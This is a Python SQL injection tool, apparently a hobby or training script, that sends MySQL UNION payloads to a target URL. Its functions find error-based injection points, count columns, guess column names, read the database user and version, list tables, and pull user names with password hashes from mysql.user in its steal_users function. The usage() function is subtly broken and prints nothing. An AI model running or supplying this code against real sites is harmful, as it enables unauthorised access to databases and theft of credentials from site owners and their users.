import requests
from threading import Thread
import sys
from termcolor import colored
import getopt
import re
from collections import defaultdict

def banner():
    print("\n********************")
    print('*  SQL Injector  *')
    print("********************")

def usage():
    def usage():
        print("Usage:")
        print("         -w: url (http://somesite.com/news.php?id=FUZZ")
        print("         -i: injection strings file")
        #print("         -u: username")
        #print("         -f: dictionary file \n")
        print("example: SQL_Injector.py -w http://targetsite.com/news.php?id=FUZZ  -i common.txt\n")

def start(argv):
    banner()
    if len(sys.argv) < 2:
        usage()
        sys.exit()

    try:
        opts, args = getopt.getopt(argv, "w:i:")
    except getopt.GetoptError:
        print("Error en arguments")
        sys.exit()

    for opt,arg in opts:
        if opt == '-w':
            url = arg
        elif opt == '-i':
            dictio = arg

    try:
       print('Opening injections file: ' + dictio)
       f = open(dictio, "r")
       name = f.read().splitlines()
    except:
        print("Failed opening file: " + dictio)
        sys.exit()

    launcher(url, name)


def launcher(url, diction):
    injected = []
    for sql_inject in diction:
        injected.append(url.replace('FUZZ', sql_inject))

    res = injector(injected)
    print("Detection results:")
    print("-------------------")

    for x in res:
        print(x.split(';')[0])

    nums_of_col = detect_columns(url)
    print('\nNumber of columns:' + colored(str(nums_of_col), 'green') + '\n')
    print(colored('---------------------------------', 'blue'))
    print(colored('Column names', 'blue'))
    print(colored('---------------------------------', 'blue'))
    [print(colored(name,'green')) for name in detect_columns_names(url)]

    username = detect_user(url)
    print('\nUsername is:\n' + username)
    print('\nVersion is:\n' + detect_version(url))
    print('\n'+colored('Users of databases: ','blue'))
    users = steal_users(url)
    for user in users:
        print(user, users[user])
    databases = detect_table_names(url)
    for base in databases:
        print(colored('---------------------------------', 'blue'))
        print(colored(base,'blue'))
        print(colored('---------------------------------', 'blue'))
        [print(table) for table in databases[base]]




def detect_columns(url):
    new_url = url.replace('FUZZ', "' order by X-- -")
    x = 1
    for i in range(1,50):
        req = requests.get(new_url.replace('X', str(i)))
        if req.text.find("Unknown") != -1:
            x = i
            break
    return str(x-1)

def detect_columns_names(url):
    column_names = ['username', 'name', 'pass', 'passwd', 'password', 'id', 'role', 'surname', 'address']
    new_url = url.replace("FUZZ", "' group by X-- -")

    valid_cols = []
    for name in column_names:
        req = requests.get(new_url.replace('X', name))
        if req.text.find('Unknown') == -1:
            valid_cols.append(name)
        else:
            pass

    return valid_cols

def injector(injected):
    errors = ['Mysql', 'error in your SQL']
    results = []

    for y in injected:
        print("[-] Testing errors: " + y)
        req = requests.get(y)

        for x in errors:
            if req.text.find(x) != -1:
                res = y + ';' + x
                results.append(res)
    return results

def detect_user(url):
    new_url = url.replace("FUZZ","-1'union select 1,CONCAT('TOK',user(),'TOK')-- -")
    req = requests.get(new_url)
    search_pattern = "TOK([a-zA-Z0-9].+?)TOK+?"

    return re.search(search_pattern,req.text).group(1)

def detect_version(url):
    new_url=url.replace("FUZZ", "-1'union select 1,concat('TOK',@@version,'TOK')-- -")
    search_pattern = re.compile('TOK([a-zA-Z0-9].+?)TOK+?')
    req = requests.get(new_url)
    version = search_pattern.search(req.text)
    return version[1] #эквивалентно version.group(1) одни скобки-одна группа. Групппой убираем TOK TOK

def steal_users(url):
    new_url = url.replace("FUZZ","-1'union select concat('TOK',user,'TOK'),concat('TIC',password,'TIC') from mysql.user-- -")
    req = requests.get(new_url)
    search_pattern = re.compile(r'Name: TOK([a-zA-Z].+?)TOK<br />role: TIC\*([A-Z0-9].+?)TIC')
    result_of_parse = search_pattern.findall(req.text)
    users_data = dict()
    for result in result_of_parse:
    #    print(result.group(1))
        users_data[result[0]] = result[1]
    return users_data

def detect_table_names(url):
    injection = "-1'union select table_schema,table_name from information_schema.tables WHERE table_schema!='mysql'AND " \
                "table_schema!='information_schema'AND table_schema!='performance_schema'-- -"
    new_url = url.replace("FUZZ",injection)
    req = requests.get(new_url)
    search_pattern = re.compile(r'Name: ([a-z]+?)<br />[a-z]+: ([a-z0-9_]+)')
    result_of_parse = search_pattern.findall(req.text)
    databases = defaultdict(list)
    for name,tables in result_of_parse:
        if tables not in databases[name]:
            databases[name].append(tables)
        else:
            pass
    return databases

if __name__ == "__main__":
    try:
        start(sys.argv[1:])

    except KeyboardInterrupt:
        print("Back interrupted by user, killing all threads..!!")

